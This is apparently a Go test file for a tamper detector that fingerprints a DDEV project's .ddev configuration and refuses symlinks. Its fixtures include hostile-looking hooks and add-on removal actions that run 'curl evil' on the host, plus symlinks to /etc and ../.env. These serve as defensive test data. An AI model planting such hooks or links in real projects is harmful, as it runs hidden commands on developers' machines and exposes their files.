package integrity

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, ".ddev", rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestSnapshotAndDiff(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	write(t, root, "commands/web/foo", "#!/bin/bash\n")
	write(t, root, ".ddev-docker-compose-full.yaml", "generated\n")
	write(t, root, "traefik/config/demo.yaml", "#ddev-generated\nstuff\n")
	write(t, root, "db_snapshots/x.gz", "data")

	approved, err := Snapshot(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(approved) != 2 {
		t.Fatalf("expected config.yaml and commands/web/foo only, got %v", approved)
	}

	// Generated and data files may change freely.
	write(t, root, ".ddev-docker-compose-full.yaml", "regenerated\n")
	write(t, root, "traefik/config/demo.yaml", "#ddev-generated\nother\n")
	write(t, root, "db_snapshots/y.gz", "data")
	cur, _ := Snapshot(root)
	if d := Diff(approved, cur); len(d) != 0 {
		t.Fatalf("unexpected diff %v", d)
	}

	write(t, root, "config.yaml", "name: demo\nhooks:\n  post-start:\n    - exec-host: curl evil\n")
	write(t, root, "docker-compose.evil.yaml", "services: {}\n")
	os.Remove(filepath.Join(root, ".ddev", "commands", "web", "foo"))
	cur, _ = Snapshot(root)
	d := Diff(approved, cur)
	want := []string{"added: .ddev/docker-compose.evil.yaml", "changed: .ddev/config.yaml", "removed: .ddev/commands/web/foo"}
	if len(d) != 3 || d[0] != want[0] || d[1] != want[1] || d[2] != want[2] {
		t.Fatalf("diff = %v, want %v", d, want)
	}
}

func TestForgedMarkerIsFingerprinted(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	a, _ := Snapshot(root)
	for _, f := range []string{
		"config.evil.yaml",
		"docker-compose.evil.yaml",
		"commands/host/evil",
		"commands/web/README.evil", // README in a container command dir is fine ...
		"mutagen/mutagen.yml",
		".env.web",
	} {
		write(t, root, f, "#ddev-generated\nhooks: {post-start: [{exec-host: curl evil}]}\n")
	}
	b, _ := Snapshot(root)
	d := Diff(a, b)
	// ... so only five of the six files count.
	if len(d) != 5 {
		t.Fatalf("forged #ddev-generated files must be fingerprinted, diff = %v", d)
	}
	// Add-on manifests hold removal_actions that ddev runs on the host ...
	write(t, root, "addon-metadata/ddev-bridge/manifest.yaml", "removal_actions: [curl evil]\n")
	c, _ := Snapshot(root)
	if d := Diff(b, c); len(d) != 1 || d[0] != "added: .ddev/addon-metadata/ddev-bridge/manifest.yaml" {
		t.Fatalf("add-on manifests must be fingerprinted, diff = %v", d)
	}
	// ... the rest of addon-metadata is bookkeeping and stays ignored.
	write(t, root, "addon-metadata/ddev-bridge/other.yaml", "x")
	write(t, root, "addon-metadata/manifest.yaml", "x")
	write(t, root, "addon-metadata/x/sub/manifest.yaml", "x")
	if e, _ := Snapshot(root); len(Diff(c, e)) != 0 {
		t.Fatalf("only addon-metadata/<name>/manifest.yaml counts, diff = %v", Diff(c, e))
	}
}

func TestSymlinkRefused(t *testing.T) {
	for _, tc := range []struct{ name, link, target string }{
		{"file", "config.z.yaml", "../web/x.yaml"},
		{"dir", "commands/host", "../scripts"},
		{"absolute", "homeadditions", "/etc"},
		{"env file", ".env.web", "../.env"},
		{"addon dir", "addon-metadata/foo", "../../x"},
		{"addon root", "addon-metadata", "../x"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, "config.yaml", "name: demo\n")
			p := filepath.Join(root, ".ddev", tc.link)
			os.MkdirAll(filepath.Dir(p), 0o755)
			if err := os.Symlink(tc.target, p); err != nil {
				t.Fatal(err)
			}
			_, err := Snapshot(root)
			if err == nil || !strings.Contains(err.Error(), ".ddev/"+tc.link+" is a symlink") {
				t.Fatalf("want symlink error, got %v", err)
			}
		})
	}
}

func TestDdevDirSymlinkRefused(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	os.Rename(filepath.Join(root, ".ddev"), filepath.Join(root, "real"))
	os.Symlink("real", filepath.Join(root, ".ddev"))
	if _, err := Snapshot(root); err == nil || !strings.Contains(err.Error(), ".ddev is a symlink") {
		t.Fatalf("want symlink error, got %v", err)
	}
}

// Links where the walk does not look (data, ddev's dot-files, add-on
// bookkeeping) are not configuration and stay allowed.
func TestSymlinkInSkippedPlaces(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	write(t, root, "addon-metadata/foo/manifest.yaml", "name: foo\n")
	for _, l := range []string{"db_snapshots", ".homeadditions", "addon-metadata/foo/other"} {
		if err := os.Symlink("/tmp", filepath.Join(root, ".ddev", l)); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := Snapshot(root); err != nil {
		t.Fatal(err)
	}
}

func TestAddonManifestHint(t *testing.T) {
	for _, c := range []struct {
		diff []string
		hint bool
	}{
		{nil, false},
		{[]string{"added: .ddev/addon-metadata/ddev-bridge/manifest.yaml"}, true},
		{[]string{"changed: .ddev/addon-metadata/a/manifest.yaml", "removed: .ddev/addon-metadata/b/manifest.yaml"}, true},
		{[]string{"added: .ddev/addon-metadata/ddev-bridge/manifest.yaml", "changed: .ddev/config.yaml"}, false},
		{[]string{"added: .ddev/addon-metadata/x/sub/manifest.yaml"}, false},
		{[]string{"added: .ddev/commands/host/manifest.yaml"}, false},
	} {
		if got := AddonManifestHint(c.diff) != ""; got != c.hint {
			t.Errorf("AddonManifestHint(%v) = %v, want %v", c.diff, got, c.hint)
		}
	}
}
